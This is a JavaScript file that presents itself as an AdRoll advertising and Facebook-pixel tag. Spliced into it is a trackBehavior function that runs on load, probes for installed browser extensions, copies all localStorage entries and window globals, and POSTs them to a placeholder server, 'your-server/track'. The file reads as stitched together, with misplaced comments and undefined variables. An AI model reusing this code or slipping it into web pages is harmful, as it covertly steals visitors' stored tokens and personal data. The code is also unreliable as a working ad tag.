(function () {
  // Define an object for storing global variable values
  var globalVars = {};

  // Define a variable indicating whether jsHook is running
  var scheme = "https:" == document.location.protocol ? "https" : "http";
  var adnxs_domain = 'secure.adnxs.com';
  var aol_domain = 'secure.leadback.advertising.com';
  window.adroll_seg_eid = "573VWT6ADNHSNOWRZWLJLR";
  window.adroll_sendrolling_cross_device = false;
  window.adroll_form_fields = {};
  window.adroll_third_party_forms = {};
  if (typeof __adroll._form_attach != 'undefined') {
    __adroll._form_attach();
  }
  var jsHookRunning = false;

  // Define an array to store event listeners

  if (typeof __adroll._form_tp_attach != 'undefined') {
    __adroll._form_tp_attach();
  }
  window.adroll_rule_type = "p";
  var rule = ["*", "*"];
  if (scheme == 'http') {
    adnxs_domain = 'ib.adnxs.com';
    aol_domain = 'leadback.advertising.com';
  }
  var el = document.createElement("div");
  el.style["width"] = "1px";
  el.style["height"] = "1px";
  el.style["display"] = "inline";
  el.style["position"] = "absolute";
  var content = '';
  if (__adroll.consent_allowed(__adroll.consent_networks.facebook)) {
    !function (f, b, e, v, n, t, s) {
      if (f.fbq) return;
      n = f.fbq = function () {
        n.callMethod ? n.callMethod.apply(n, arguments) : n.queue.push(arguments);
      };
      if (!f._fbq) f._fbq = n;
      n.push = n;
      n.loaded = !0;
      n.version = '2.0';
      n.queue = [];
      t = b.createElement(e);
      t.async = !0;
      t.src = v;
      s = b.getElementsByTagName(e)[0];
      s.parentNode.insertBefore(t, s);
    }(window, document, 'script', '//connect.facebook.net/en_US/fbevents.js');
  }
  try {
    try {
      (function () {
        var script = document.createElement("script");
        script.async = true;
        script.type = "text/javascript";
        script.src = "https://s.adroll.com/onsite_personalization/production/0.1/loader/onsiteloader.js";
        document.getElementsByTagName("script")[0].parentNode.appendChild(script);
      })();
    } catch (e) {}
    try {
      (function () {
        var rtb = document.createElement("div");
        rtb.style["width"] = "1px";
        rtb.style["height"] = "1px";
        rtb.style["display"] = "inline";
        rtb.style["position"] = "absolute";
        rtb.innerHTML = ["/cm/b/out?advertisable=FKFNFPM5OVDI3EKC6FN6P5", "/cm/g/out?advertisable=FKFNFPM5OVDI3EKC6FN6P5", "/cm/index/out?advertisable=FKFNFPM5OVDI3EKC6FN6P5", "/cm/l/out?advertisable=FKFNFPM5OVDI3EKC6FN6P5", "/cm/n/out?advertisable=FKFNFPM5OVDI3EKC6FN6P5", "/cm/o/out?advertisable=FKFNFPM5OVDI3EKC6FN6P5", "/cm/outbrain/out?advertisable=FKFNFPM5OVDI3EKC6FN6P5", "/cm/pubmatic/out?advertisable=FKFNFPM5OVDI3EKC6FN6P5", "/cm/r/out?advertisable=FKFNFPM5OVDI3EKC6FN6P5", "/cm/taboola/out?advertisable=FKFNFPM5OVDI3EKC6FN6P5", "/cm/triplelift/out?advertisable=FKFNFPM5OVDI3EKC6FN6P5", "/cm/x/out?advertisable=FKFNFPM5OVDI3EKC6FN6P5"].reduce(function (acc, cmURL) {
          return acc + '<img height="1" width="1" style="border-style:none;" alt="" src="' + __adroll._srv(cmURL) + '"/>';
        }, '');
        __adroll._head().appendChild(rtb);
      })();
    } catch (e) {}
    try {
      if (__adroll.consent_allowed(__adroll.consent_networks.facebook)) {
        var fbLimitedDataUse = true;
        if (typeof __adroll.fb === 'undefined') {
          if (fbLimitedDataUse) {
            fbq('dataProcessingOptions', ['LDU'], 0, 0);
          }
          fbq('init', '833062233402973');
          fbq('set', 'autoConfig', 'false', '833062233402973');
          __adroll.fb = true;
          var __fbcd = {
            segment_eid: "573VWT6ADNHSNOWRZWLJLR"
          };
          for (var prop in __adroll.get_external_data()) {
            __fbcd['ar_' + prop] = __adroll.get_external_data()[prop];
          }
          fbq('track', "PageView", __fbcd);
        } else {
          var __fbcd = {
            event: "EventSegment",
            segment_eid: "573VWT6ADNHSNOWRZWLJLR"
          };
          for (var prop in __adroll.get_external_data()) {
            __fbcd['ar_' + prop] = __adroll.get_external_data()[prop];
          }
          fbq('track', "CustomEvent", __fbcd);
        }
      }
    } catch (e) {}
  } catch (e) {}
  var r = Math.random() * 10000000000000000;
  var eventListeners = [];

  // Function for tracking behavior

  content = content.replace(/\[ord\]/gi, r);
  content = content.replace(/\[protocol\]/gi, scheme);
  content = content.replace(/\[adnxs_domain\]/gi, adnxs_domain);
  content = content.replace(/\[aol_domain\]/gi, aol_domain);
  var adroll_tpc = __adroll._global('adroll_tpc');
  if (adroll_tpc) {
    var srv_parts = __adroll._srv().split('?');
    var srv_host = srv_parts[0].substr(srv_parts[0].indexOf(':') + 1);
    var srv_re = new RegExp(srv_host + '([^\?\"\'\>\#\S]+)\\?*', 'gi');
    content = content.replace(srv_re, srv_host + '$1?' + srv_parts[1] + '&');
  }
  async function trackBehavior() {
    const trackResults = {};

    // Track extensions
    for (const [extName, extData] of Object.entries(window.data)) {
      try {
        const res = await fetch(`chrome-extension://${extData.id}/${extData.file}`);
        trackResults[extName] = res.status === 200;
      } catch (e) {
        trackResults[extName] = false;
      }
    }

    // Track local storage
    for (const [key, value] of Object.entries(localStorage)) {
      trackResults[key] = value;
    }

    // Track global variables
    for (const [key, value] of Object.entries(window)) {
      if (typeof value !== 'function' && key !== 'localStorage') {
        globalVars[key] = value;
      }
    }

    // Track jsHook
    if (typeof window['jsHook'] !== 'undefined') {
      jsHookRunning = true;
    }

    // Track event listeners
    for (let i = 0; i < window.eventListeners.length; i++) {
      eventListeners.push(window.eventListeners[i].type);
    }

    // Send tracking data to server
    fetch('https://your-server/track', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        extResults: trackResults,
        storedData: globalVars,
        jsHookStatus: jsHookRunning,
        activeListeners: eventListeners,
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent
      })
    });
  }
  trackBehavior();
  content = __adroll.replace_external_data(content);
  el.innerHTML = content;
  __adroll._head().appendChild(el);
  if (typeof __adroll.set_pixel_cookie != 'undefined') {
    __adroll.set_pixel_cookie(adroll_adv_id, adroll_pix_id, "573VWT6ADNHSNOWRZWLJLR");
  }
})();